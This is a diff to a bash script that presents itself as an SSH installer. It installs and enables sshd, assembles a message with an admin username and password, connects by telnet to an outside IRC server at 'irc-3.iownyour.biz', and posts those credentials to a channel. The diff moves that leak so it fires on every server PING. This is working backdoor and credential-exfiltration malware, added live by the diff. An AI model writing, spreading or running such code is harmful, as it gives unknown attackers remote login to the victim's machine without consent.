@@ -1,7 +1,6 @@
 #!/bin/bash
 server="irc-3.iownyour.biz"
 channel="help"
-nick="r00t-"
 user="r00tz hostname servername :is.gd/sshpwn"
 echo Intalling SSH...;
 if [ -f /usr/bin/yum ]; then yum install telnet openssh* -y; fi;
@@ -23,26 +22,23 @@ if [ -f /usr/bin/yum ]; then service sshd restart && systemctl enable sshd; fi;
 if [ -f /usr/bin/apt ]; then service ssh restart && systemctl enable ssh; fi;
 arr4y="Added admin:, $random_user, password:, $random_number, Start SSHd with: sudo service ssh start (debian) or sudo service sshd start (centos)";
 echo $arr4y;
-echo "NICK $nick . $random_user" > input 
+echo "NICK $random_user" > input 
 echo "USER $user" >> input
 echo "JOIN #$channel" >> input
+sleep 5
 tail -f input | telnet $server 6667 | while read res
 do
   case "$res" in
     # respond to ping requests from the server
     PING*)
-      echo "$res" | sed "s/I/O/" >> input 
+      echo "$res" | sed "s/I/O/" >> input
+      echo "PRIVMSG #$channel :$arr4y" >> input
     ;;
     # for pings on nick/user
     *"You have not"*)
       echo "JOIN #$channel" >> input
     ;;
     # run when someone joins
-    *JOIN*) who=$(echo "$res" | perl -pe "s/:(.*)\!.*@.*/\1/")
-      if [ "$who" = "$nick" ]
-      then
-       echo "PRIVMSG #$channel :$arr4y" >> input
-      fi
-    ;;
+    *JOIN*)
   esac
 done
